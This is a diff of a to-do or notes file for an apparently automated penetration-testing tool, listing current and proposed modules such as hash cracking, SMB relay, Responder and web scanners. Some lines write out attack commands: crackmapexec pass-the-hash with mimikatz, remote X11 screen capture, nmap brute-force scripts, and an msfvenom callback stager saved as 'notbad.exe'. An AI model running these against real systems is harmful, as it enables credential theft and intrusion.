@@ -1,60 +1,27 @@
-Core Functionality:
-    Save/restore KB
+New Module Ideas:
 
-Modules:
+johnTR
+hashcat
+psexec.py
+smbrelayx
+ipmitest
 
-    #1 address all TDODs in the current modules
-    #2 make sure all modules contribute to the reporting
-    #3 fix any issues in current modules
-    #4 new modules
-        *1) password cracking:   john, hashcat
-        *2) password testing:    hydra, medusa
-        3) possibly use Impacket's psexec.py to open windows shells
-        4) attempt to gather creds via responder/smbrelayx
-        5) ipmi tests:  ipmitool, msf
-        6) snmp tests:  << nmap -sU -p161 --script=snmp-brute [targets] >>
-        *7) X11 testing and screenshots:  xwd -root -screen -silent -display [target]:0 | xwdtopnm | pnmtopng > [target].png
-        8) run crackmapexec.py on all windows systems for all usercreds:    ./crackmapexec.py [target] -d WORKGROUP -u [user] -H [hash] --mimikatz
-        9) nmap test telnet services:  nmap -p23 --script=telnet-brute [targets]
-        10) possibly use msfvenom to use to push to systems:   msfvenom -p auxiliary/pro/generate_dynamic_stager host=[LOCAL IP] port=[LOCAL PORT] -f exe > notbad.exe
+jexboss
+smtp-user-enum
+crackmapexec     crackmapexec.py [target] -d WORKGROUP -u [user] -H [hash] --mimikatz
+gpp
+openx11 screenshot/keylogging	xwd -root -screen -silent -display [target]:0 | xwdtopnm | pnmtopng > [target].png
+cisco smart install
+multi relay
+searchsploit
 
-CURRENT MODULES:
-    anonftp                   Test for Anonymous FTP
-    anonldap                  Test for Anonymous LDAP Searches
-    crackPasswordHashJohnTR   Attempt to crack any password hashes
-    gethostname               Determine the hostname for each IP
-    httpoptions               Get HTTP Options
-    httpscreenshot            Get Screen Shot of Web Pages
-    httpserverversion         Get HTTP Server Version
-    hydrasmbpassword          Attempt to bruteforce SMB passwords
-    impacketsecretsdump       Test for NULL Session
-    msf_dumphashes            Gather hashes from MSF Sessions
-    msf_gathersessioninfo     Get Info about any new sessions
-    msf_javarmi               Attempt to Exploit A Java RMI Service
-    msf_ms08_067              Attempt to exploit MS08-067
-    msf_openx11               Attempt Login To Open X11 Service
-    msf_smbuserenum           Get List of Users From SMB
-    msf_snmpenumshares        Enumerate SMB Shares via LanManager OID Values
-    msf_snmpenumusers         Enumerate Local User Accounts Using LanManager/psProcessUsername OID Values
-    msf_snmplogin             Attempt Login Using Common Community Strings
-    msf_vncnoneauth           Detect VNC Services with the None authentication type
-    nmapbasescan              Standard NMap Scan
-    nmaploadxml               Load NMap XML File
-    nmapms08067scan           NMap MS08-067 Scan
-    nmapnfsshares             NMap NFS Share Scan
-    nmapsmbshares             NMap SMB Share Scan
-    nmapsmbsigning            NMap SMB-Signing Scan
-    nmapsslscan               NMap SSL Scan
-    nmapvncbrute              NMap VNC Brute Scan
-    nullsessionrpcclient      Test for NULL Session
-    nullsessionsmbclient      Test for NULL Session
-    openx11                   Attempt Login To Open X11 Servicei and Get Screenshot
-    reportgen                 Generate Report
-    responder                 Run Responder and watch for hashes
-    searchftp                 Search files on FTP
-    searchnfsshare            Search files on NFS Shares
-    searchsmbshare            Search files on SMB Shares
-    snmpwalk		      Run snmpwalk with each found community string
-    sslsslscan                Determine SSL protocols and ciphers
-    ssltestsslserver          Determine SSL protocols and ciphers
-    userenumrpcclient         Get List of Users From SMB
+wpscan
+joomscan
+cmsmap
+nikto
+arachni
+sqlmap
+xsstracer
+whatweb
+wafw00f
+droopscan
